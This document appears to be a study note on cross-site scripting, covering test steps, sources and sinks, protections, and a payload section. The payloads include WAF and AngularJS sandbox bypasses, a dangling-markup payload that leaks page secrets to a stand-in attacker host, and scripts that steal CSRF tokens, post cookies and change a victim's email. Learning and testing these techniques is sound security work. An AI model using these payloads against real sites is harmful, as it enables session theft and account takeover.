# Cross-Site Scripting

Cross-Site Scripting is all about getting malicious javascript to execute. This allows an attacker to do basically anything on the client-side of the targeted user. A basic test to check if XSS is working, is by invoking the `alert(1)` function. Or use `alert(document.domain)` to show what domain the javascript is executing on. 

An attacker is then able to
- Impersonate or masquerade as the victim user
- Carry out any action that the user is able to perform
- Read any data that the user is able to access
- Capture the user's login credentials
- Perform virtual defacement of the web site
- Inject trojan functionality into the web site

## Reflected XSS
User input is immediatly reflected in the response in an unsafe way that allows for malicious javascript to execute. For example in a search feature it says "Results for '\<script>alert(1)\</script>'".

1. Test every entry point, input parameters, URL file path, http headers, etc
2. Submit random alphanumeric values, and check if they are reflected
3. Determine the reflection context, inbetween tags, in javascript string, etc. Take a look at the [Proof of Concepts](#proof-of-concepts) on how to escape certain contexts
4. Test different payloads, [cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
5. Test the attack in browser

## Stored XSS
Inputted data is later used by the application in an unsafe way that allows for malicious javascript to execute. For example in a comment feature "Comment: \<script>alert(1)\</script>".

1. Try to find connections between entry points (input parameters, URL file path, http headers, etc) and exit points (all http responses that are returned to a user in any situation)
2. Do this by submitting specific values into all entry points, and monitoring if any response contains any of those values
3. Determine the context, inbetween tags, in javascript string, etc. Take a look at the [Proof of Concepts](#proof-of-concepts) on how to escape certain contexts
4. Test different payloads, [cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
5. Test the attack in browser

## DOM-based XSS
Client-side javascript processes data in an unsafe way, usually by writing the data back to the [DOM](https://en.wikipedia.org/wiki/Document_Object_Model). For example, javascript reads a value from an input field and writes it back to an HTML element.

You need a source, e.g.:
```js
document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location.search
location.hash
document.cookie
document.referrer
```

And a sink in the javascript code, e.g.: 
```js
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
eval()
```

Or a sink in third-party libraries/frameworks, e.g. [jQuery](https://jquery.com/) (sink: `$(xss)`), [AngularJS](https://angularjs.org/) (sink: `{{xss}}`), etc

To find what sources and sinks work, input random strings, and use developer tools to inspect the HTML, or use a javascript debugger. This task can be quite tedious.

## Dangling Markup
Imagine a normal XSS attack is not possible, but you can still inject some input that gets parsed in an unsafe way. Then you can sometimes perform a dangling markup attack. Use a payload like this:

```html
"><img src='//attacker-website.com?
```

This first breaks out of the parent html tag, and then uses an img tag to make a request to the attacker controlled website. But notice that the source link does not have a closing qoute. Now all characters up until some `'` get sent to the attacker controlled website. If you are lucky, this might include CSRF tokens, passwords, or something else sensitive.

## Protections
- The [Content-Security-Policy header](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) limits the effect of XSS attacks. Or even fully blocks some injected scripts to execute
- Encoding data on output
- Validating input on arrival

These three together do a good job of protecting against XSS. Probably the most vulnerable parts of a website are places where users are allowed to input some kind of html markup. Because it is hard to blacklist every malicious attribute, and whitelisting might not cut it.

## Proof of Concepts

Take a look at this amazing [Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) from portswigger.

### In Attribute String
```html
"><script>alert(1)</script>
```
```html
" autofocus onfocus=alert(1) x="
```
```html
<a href="javascript:alert(1)">
```

### In Javascript String
```html
</script><img src=1 onerror=alert(1)>
```
```js
'-alert(1)-'
```
```js
';alert(1)//
```
```js
\';alert(1)//
```
```html
&apos;-alert(1)-&apos;
```

### Blocked characters | WAF
```html
onerror=alert;throw 1
```
```html
<script>{onerror=eval}throw'=alert\x281\x29'</script>
```
```html
<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
```

### Template Literal
```js
${alert(1)}
```

### AngularJS | Sandboxed | CSP
```js
'a'.constructor.prototype.charAt=[].join
$eval('x=alert(1)')
```
```js
// fromCharCode() translates to: x=alert(1)
toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
```
```html
<input autofocus ng-focus="$event.path|orderBy:'[].constructor.from([1],alert)'">
<!-- Or use array.map() to hide from the CSP: "[1].map(alert)" -->
```

### XSS->CSRF
```html
<script>
window.addEventListener('DOMContentLoaded', function(){

var token = document.getElementsByName('csrf')[0].value;
var data = new FormData();

data.append('csrf', token);
data.append('postId', 3);
data.append('comment', document.cookie);
data.append('name', 'victim');
data.append('email', 'foo@bar.com');
data.append('website', 'http://foo.bar');

fetch('/post/comment', {
    method: 'POST',
    mode: 'no-cors',
    body: data
});
});
</script>
```
```html
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=foo@bar.com')
};
</script>
```